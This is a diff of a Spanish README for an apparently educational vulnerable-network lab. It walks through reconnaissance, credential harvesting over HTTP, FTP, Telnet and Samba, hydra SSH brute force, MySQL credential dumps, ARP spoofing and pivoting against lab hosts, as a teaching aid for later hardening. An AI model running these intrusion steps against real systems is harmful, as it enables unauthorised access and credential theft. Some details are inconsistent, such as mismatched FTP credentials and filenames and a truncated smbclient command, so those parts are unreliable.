@@ -134,71 +134,257 @@ automáticamente: `firewall` → `internal-server` → `dmz-server` → `externa
 
 ## Escenarios de ataque
 
-Todos los ataques se ejecutan desde `external-kali` (`vagrant ssh external-kali`).
+Todos los ataques se ejecutan desde `external-kali`. Para acceder:
+
+```bash
+vagrant ssh external-kali
+```
+
+---
 
 ### 1. Reconocimiento de red
 
+El primer paso de cualquier ataque es identificar qué máquinas existen y qué
+servicios exponen. Como el firewall no filtra sondas de reconocimiento, nmap
+obtiene información completa de versiones y puertos.
+
 ```bash
-# Descubrimiento de hosts activos
-netdiscover -r 192.168.57.0/24
-netdiscover -r 192.168.58.0/24
+# Escaneo rápido de servicios en la DMZ
+nmap 192.168.57.10
 
-# Escaneo de puertos y servicios
-nmap-quick 192.168.57.10      # dmz-server
-nmap-full  192.168.58.10      # internal-server
+# Escaneo completo del servidor interno
+nmap -sV -sC -O -p- -T4 192.168.58.10
 
-# Enumeración SMB
+# Enumeración SMB del servidor interno:
+# revela shares, usuarios, política de contraseñas y workgroup
+# sin necesidad de credenciales
 enum4linux 192.168.58.10
 ```
 
-### 2. Acceso a DMZ
+**Qué demuestra:** sin reglas que limiten ICMP ni sondas TCP, un atacante
+externo obtiene en segundos el mapa completo de la infraestructura interna,
+incluyendo versiones exactas de software que pueden tener CVEs conocidos.
+
+Para descubrimiento ARP en la red DMZ (requiere estar en el mismo segmento,
+útil tras pivotar desde dmz-server):
 
 ```bash
-# Descargar credenciales expuestas vía HTTP
+# Desde dmz-server tras acceder por Telnet o SSH
+netdiscover -i enp0s8 -r 192.168.57.0/24
+netdiscover -i enp0s8 -r 192.168.58.0/24
+```
+
+---
+
+### 2. Acceso a la DMZ
+
+#### 2.1 Exfiltración de información vía HTTP
+
+El servidor Apache tiene directory listing habilitado y expone directorios con
+ficheros sensibles descargables sin autenticación.
+
+```bash
+# Descargar credenciales corporativas expuestas en /backup/
 curl http://192.168.57.10/backup/credentials.txt
-curl http://192.168.57.10/info.php        # phpinfo completo
 
-# FTP anónimo
-ftp 192.168.57.10
-# usuario: anonymous / sin contraseña
-# get /public/config_backup.txt
-
-# Telnet en texto claro (capturar con Wireshark en paralelo)
-telnet 192.168.57.10
-# usuario: operator / contraseña: operator
+# Ver información completa del servidor PHP (versión, módulos,
+# variables de entorno, rutas del sistema)
+curl http://192.168.57.10/info.php
 ```
 
-### 3. Acceso a red interna
+**Qué demuestra:** `ServerTokens Full` + directory listing permite a un
+atacante obtener credenciales reales y el mapa de red interna sin explotar
+ninguna vulnerabilidad, solo navegando por la web.
+
+#### 2.2 FTP anónimo
+
+vsftpd está configurado con `anonymous_enable=YES` y `no_anon_password=YES`,
+lo que permite acceder y descargar ficheros sin ninguna credencial.
 
 ```bash
-# Fuerza bruta SSH con hydra
-hydra -l root -p root ssh://192.168.58.10
+ftp 192.168.57.10
+# Cuando pregunte usuario: ftpoperator
+# Cuando pregunte contraseña: ftoperator
+#tal como se configuró.
 
-# Acceso MySQL sin contraseña
-mysql -h 192.168.58.10 -u root
-# USE corporativedb; SELECT * FROM user_credentials;
-
-# Recurso Samba anónimo
-smbclient //192.168.58.10/confidential -N
-# get passwords.txt
+ftp> cd public
+ftp> get passwords.txt
+ftp> exit
 ```
+
+**Qué demuestra:** el fichero `config_backup.txt` contiene credenciales de
+base de datos en texto plano, incluyendo la IP y usuario de MySQL del servidor
+interno. Un atacante obtiene acceso a la red interna sin haber comprometido
+ningún sistema todavía.
+
+#### 2.3 Telnet — credenciales en texto claro
+
+Telnet transmite todo sin cifrar. Las credenciales son visibles en la red en
+el momento del login.
+
+```bash
+telnet 192.168.57.10
+# Login: ftpoperator
+# Password: ftpoperator
+```
+
+**Qué demuestra:** cualquier atacante posicionado como MITM en el segmento
+(ver escenario 4) captura usuario y contraseña en texto plano. SSH cifra esta
+misma información — Telnet no.
+
+---
+
+### 3. Acceso a la red interna
+
+#### 3.1 Fuerza bruta SSH
+
+El servidor interno tiene SSH con `PermitRootLogin yes`, `PasswordAuthentication yes`
+y sin límite de intentos efectivo. Hydra automatiza la fuerza bruta.
+
+```bash
+# Desde external-kali directamente — el firewall no bloquea
+# tráfico externo hacia la red interna (mala práctica grave)
+hydra -l root -p root ssh://192.168.58.10
+```
+
+**Qué demuestra:** la combinación de credenciales débiles + SSH expuesto sin
+protección + firewall permisivo permite acceso root completo al servidor
+interno en menos de un segundo. En el Bloque 3, fail2ban bloquearía la IP
+tras el primer intento fallido.
+
+#### 3.2 Acceso MySQL sin contraseña
+
+MySQL está configurado con `bind-address = 0.0.0.0` y el usuario root sin
+contraseña, aceptando conexiones desde cualquier IP.
+
+**Acceso directo desde external-kali:**
+
+```bash
+# El firewall permite tráfico externo → interno en el puerto 3306
+# directamente, sin necesidad de pivotar
+mysql -h 192.168.58.10 -u root --ssl=1 --ssl-verify-server-cert=OFF
+
+mysql> USE corporativedb;
+mysql> SELECT * FROM user_credentials;
+mysql> SELECT * FROM network_inventory;
+mysql> exit
+```
+
+**Acceso por pivoting desde dmz-server** (escenario más realista — primero
+comprometer la DMZ, luego moverse a la red interna):
+
+```bash
+# Paso 1: acceder a dmz-server por Telnet o SSH desde Kali
+telnet 192.168.57.10          # usuario: ftpoperator / ftpoperator
+# o bien:
+ssh ftpoperator@192.168.57.10 # mismas credenciales
+
+# Paso 2: desde dmz-server, conectar a MySQL en la red interna
+# dmz-server tiene acceso directo a net-interna porque la DMZ
+# no está aislada — el firewall permite DMZ → interna sin filtro
+mysql -h 192.168.58.10 -u root
+
+mysql> USE corporativedb;
+mysql> SELECT * FROM user_credentials;
+```
+
+**Qué demuestra:** dos vectores distintos llegan al mismo resultado. El acceso
+directo desde el exterior demuestra que el firewall no segmenta realmente las
+redes. El pivoting demuestra que comprometer un servidor de DMZ equivale a
+comprometer la red interna completa.
+
+#### 3.3 Recurso Samba anónimo
+
+El share `confidential` tiene `guest ok = yes`, accesible sin credenciales.
+
+**Desde external-kali:**
+
+```bash
+e
+smb: \> ls
+smb: \> get passwords.txt
+smb: \> exit
+```
+
+**Desde dmz-server** (tras pivotar):
+
+```bash
+# Desde la sesión Telnet/SSH en dmz-server
+smbclient //192.168.58.10/confidential -N
+smb: \> get passwords.txt
+smb: \> exit
+```
+
+**Qué demuestra:** el fichero `passwords.txt` contiene credenciales de todos
+los servicios en texto plano. Un atacante que solo llegue a Samba ya tiene
+acceso completo a toda la infraestructura sin necesidad de explotar nada más.
+
+---
 
 ### 4. ARP Spoofing y captura de tráfico
 
-```bash
-# Habilitar ip_forward en Kali para no cortar el tráfico
-echo 1 > /proc/sys/net/ipv4/ip_forward
+El ARP Spoofing se ejecuta desde `external-kali` posicionándose entre
+`dmz-server` y el `firewall` para interceptar todo su tráfico. Como no hay
+DHCP snooping ni ARP inspection, el ataque es inmediato e indetectable.
 
-Opción B — Hacer el ARP spoof desde dmz-server tras pivoting (más realista para el escenario de TFG, demuestra escalada de privilegios).
+```bash
+# Paso 1: habilitar ip_forward en Kali para que el tráfico
+# interceptado siga fluyendo y no se corte la comunicación
+sudo sysctl -w net.ipv4.ip_forward=1
+
+# Paso 2: enviar ARP replies falsos en ambas direcciones
+# Kali le dice a dmz-server que la MAC del firewall es la suya
+# Kali le dice al firewall que la MAC de dmz-server es la suya
+sudo arpspoof -i eth1 -t 192.168.57.10 192.168.57.1 &
+sudo arpspoof -i eth1 -t 192.168.57.1  192.168.57.10 &
+
+# Paso 3: capturar el tráfico Telnet en texto claro
+# Las credenciales aparecen visibles en la captura.
+#Se puede ver el texto en claro mejor usando sudo tcpdump -i eth1 -A -s0 port 23 2>/dev/null | grep -E '[a-zA-Z]{3,}'
+sudo tcpdump -i eth1 -A -s0 port 23
 ```
+
+Mientras `tcpdump` está activo, abrir otra terminal y conectarse por Telnet
+a `dmz-server` desde cualquier máquina. Las credenciales aparecerán en texto
+plano en la captura.
+
+```bash
+# Para detener el ARP spoofing al terminar CTRL+C o:
+sudo killall arpspoof
+sudo sysctl -w net.ipv4.ip_forward=0
+```
+
+**Qué demuestra:** Telnet y FTP transmiten credenciales sin cifrar. En el
+Bloque 3 estos protocolos están eliminados y reemplazados por SSH/SFTP. La
+ausencia de ARP inspection hace el ataque trivial en cualquier red plana.
+
+---
 
 ### 5. Pivoting DMZ → red interna
 
+Este escenario resume la cadena de ataque completa y demuestra por qué la
+DMZ debe estar aislada de la red interna.
+
 ```bash
-# Desde dmz-server (tras acceder por Telnet o FTP)
-mysql -h 192.168.58.10 -u root    # acceso directo a internal-server
+# Paso 1: desde external-kali, acceder a dmz-server
+# (usando credenciales obtenidas en el escenario 2)
+ssh ftpoperator@192.168.57.10   # password: ftpoperator
+
+# Paso 2: desde dmz-server, acceder a todos los servicios
+# de la red interna directamente — el firewall no lo impide
+mysql -h 192.168.58.10 -u root 
 smbclient //192.168.58.10/confidential -N
+
+# Paso 3: acceso SSH completo al servidor interno
+# con credenciales obtenidas en escenarios anteriores
+ssh root@192.168.58.10   # password: root
 ```
+
+**Qué demuestra:** comprometer un servidor de DMZ debería ser un incidente
+contenido. En este laboratorio, equivale a comprometer toda la red interna
+porque no existe aislamiento real entre segmentos. En el Bloque 3, reglas
+de firewall explícitas impiden cualquier conexión iniciada desde la DMZ
+hacia la red interna.
 
 ---
 
